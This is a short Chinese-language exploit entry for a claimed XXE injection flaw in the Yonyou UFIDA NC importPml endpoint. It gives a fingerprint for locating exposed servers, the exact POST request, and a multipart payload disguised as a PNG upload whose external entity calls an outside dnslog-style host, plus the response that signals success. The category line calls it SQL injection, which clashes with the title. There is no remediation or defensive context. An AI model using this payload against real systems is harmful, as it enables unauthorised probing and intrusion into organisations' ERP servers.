# 用友-UFIDA-NCimportPml存在XXE实体注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1`

**Payload**
```
------WebKitFormBoundarybXJ4bi5uZXQ
Content-Disposition: form-data; name="file"; filename="1.png"
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sblsdohzht.iyhc.eu.org/"> %remote;]>
------WebKitFormBoundarybXJ4bi5uZXQ--
```
- **响应特征**：200 dnslog回显